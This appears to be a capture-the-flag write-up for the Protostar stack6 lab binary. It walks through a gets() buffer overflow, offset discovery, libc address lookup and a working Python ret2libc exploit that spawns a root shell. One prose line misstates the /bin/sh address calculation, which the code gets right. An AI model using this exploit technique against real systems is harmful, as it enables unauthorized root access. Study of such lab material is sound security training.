Source Code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

Finding the offset:
```bash
msf-pattern_create -l 100
```

```gdb
(gdb) r
Starting program: /opt/protostar/bin/stack6 
input path please: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
got path Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) info registers
eax            0x6e     110
ecx            0x0      0
edx            0xb7fd9340       -1208118464
ebx            0xb7fd7ff4       -1208123404
esp            0xbffff7a0       0xbffff7a0
ebp            0x63413563       0x63413563
esi            0x0      0
edi            0x0      0
eip            0x37634136       0x37634136
eflags         0x210296 [ PF AF SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
(gdb) 
```

eip=0x37634136, esp=0xbffff7a0

```bash
msf-pattern_offset -l 100 -q 0x37634136
```

![[Pasted image 20210727202613.png]]

offset=80

Since there is a check that if the eip starts with `0xbf`0000000

then the program will simply exit, so we can not just jump to esp i.e to our shellcode.	


ret2libc attack

https://bufferoverflows.net/ret2libc-exploitation-example/

![[Pasted image 20210730171431.png]]

```bash
user@protostar:/opt/protostar/bin$ gdb -q stack6
Reading symbols from /opt/protostar/bin/stack6...done.
(gdb) b *main
Breakpoint 1 at 0x80484fa: file stack6/stack6.c, line 26.
(gdb) r
Starting program: /opt/protostar/bin/stack6 

Breakpoint 1, main (argc=1, argv=0xbffff864)
    at stack6/stack6.c:26
26      stack6/stack6.c: No such file or directory.
        in stack6/stack6.c
```

Now after setting a break point and running the program in gdb, we will find the address of libc using `info proc mappings`

		
```bash		
(gdb) info proc mappings
process 2500
cmdline = '/opt/protostar/bin/stack6'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/stack6'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6
        0xb7e96000 0xb7e97000     0x1000          0        
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0        
        0xb7fe0000 0xb7fe2000     0x2000          0        
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
(gdb) 
```

start address of libc =  0xb7e97000

Now let's find the address for system() function

```bash
(gdb) p system
$1 = {
    <text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb)
```

so system() function is at 0xb7ecffb0

Now we need to find the where the string  "/bin/sh" is inside libc

```bash
user@protostar:~$ strings -atx /lib/libc-2.11.2.so |grep '/bin/sh' 
 11f3bf /bin/sh
user@protostar:~$
```
0x11f3bf
great so we can access /bin/sh at `0xb7ecffb0 + 0x11f3bf`

Exploit:

```python
#!/usr/bin/python

import struct

offset=80
padding="A"*offset

system=struct.pack("I",0xb7ecffb0)
exit="\x90"*4
binsh=struct.pack("I",0xb7e97000 + 0x11f3bf)


buffer = padding + system + exit + binsh 
print buffer
```



```bash
user@protostar:/opt/protostar/bin$ (python /tmp/exploit.py;cat)|./stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÏ∑êc
whoami
root
```

![[Pasted image 20210728181229.png]]